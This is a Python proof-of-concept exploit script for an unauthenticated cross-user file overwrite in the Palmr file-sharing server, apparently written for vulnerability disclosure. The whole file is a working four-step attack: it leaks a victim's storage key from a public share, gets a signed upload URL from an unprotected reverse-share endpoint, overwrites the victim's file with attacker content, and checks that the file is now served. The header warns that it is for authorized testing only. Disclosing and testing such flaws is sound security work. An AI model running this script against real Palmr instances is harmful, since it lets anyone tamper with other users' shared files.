#!/usr/bin/env python3
"""
PoC: Unauthenticated arbitrary object write / cross-user file overwrite in Palmr (kyantech/Palmr)
CWE-639 / CWE-863 | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H (9.1 Critical)
Researcher: Kashish Topiwala
Affected: POST /reverse-shares/:id/presigned-url (and /alias/:alias/presigned-url)
          apps/server/src/modules/reverse-share/{routes.ts,controller.ts,service.ts}

AUTHORIZED TESTING ONLY. Run only against a Palmr instance you own.

Root cause: the reverse-share presigned-upload endpoints have no auth hook and pass a
client-supplied objectName straight to the S3 provider's getPresignedPutUrl with no
prefix binding and no ownership check, so they will sign a PUT for ANY key in the shared
bucket. The public GET /shares/:id returns each shared file's objectName, so an
unauthenticated attacker can obtain a victim's key and overwrite that file.

This script performs the fully-unauthenticated attack given:
  --share-id     : a victim's public (no-password) share id  (leaks the target objectName)
  --reverse-id   : any active no-password reverse-share id    (used to mint the presigned PUT)
It leaks the objectName, requests a presigned PUT for it, overwrites the object, and shows
the victim's shared file now serving attacker content.
"""
import argparse, json, sys, urllib.request, urllib.error, urllib.parse

def req(method, url, body=None, headers=None):
    data = body.encode() if isinstance(body, (str,)) else body
    r = urllib.request.Request(url, data=data, headers=headers or {}, method=method)
    try:
        resp = urllib.request.urlopen(r, timeout=30)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default="http://localhost:3333", help="Palmr API base")
    ap.add_argument("--share-id", required=True, help="victim public (no-password) share id")
    ap.add_argument("--reverse-id", required=True, help="any active no-password reverse-share id")
    ap.add_argument("--payload", default="OVERWRITTEN by an unauthenticated attacker (PoC)\n")
    a = ap.parse_args()
    B = a.url.rstrip("/")

    print("[*] Step 1 (unauth): GET /shares/%s -> leak victim objectName" % a.share_id)
    st, body = req("GET", "%s/shares/%s" % (B, a.share_id))
    if st != 200:
        print("    [!] share not accessible:", st, body[:150]); sys.exit(1)
    d = json.loads(body); share = d.get("share", d)
    files = share.get("files", [])
    if not files:
        print("    [!] no files in share"); sys.exit(1)
    obj = files[0].get("objectName")
    print("    leaked objectName =", obj)

    print("[*] Step 2 (unauth): POST /reverse-shares/%s/presigned-url for the victim key" % a.reverse_id)
    st, body = req("POST", "%s/reverse-shares/%s/presigned-url" % (B, a.reverse_id),
                   json.dumps({"objectName": obj}), {"Content-Type": "application/json"})
    if st != 200:
        print("    [!] presigned request failed:", st, body[:200]); sys.exit(1)
    put_url = json.loads(body).get("url")
    print("    got presigned PUT URL for the victim's key:", put_url[:80], "...")

    print("[*] Step 3 (unauth): PUT attacker bytes to the victim's key")
    st, body = req("PUT", put_url, a.payload, {"Content-Type": "application/pdf"})
    print("    overwrite PUT ->", st)
    if st not in (200, 204):
        print("    [!] overwrite did not succeed"); sys.exit(1)

    print("[*] Step 4 (unauth): download the victim's shared file")
    st, body = req("GET", "%s/files/download-url?objectName=%s" % (B, urllib.parse.quote(obj)))
    durl = json.loads(body).get("url") if st == 200 else None
    served = ""
    if durl:
        st2, served = req("GET", durl)
    ok = a.payload.strip() in served
    print("    served content:", served.strip()[:120])
    print("\n[%s] %s" % ("VULNERABLE" if ok else "CHECK",
          "Unauthenticated cross-user file overwrite confirmed." if ok else "review output above."))

if __name__ == "__main__":
    main()
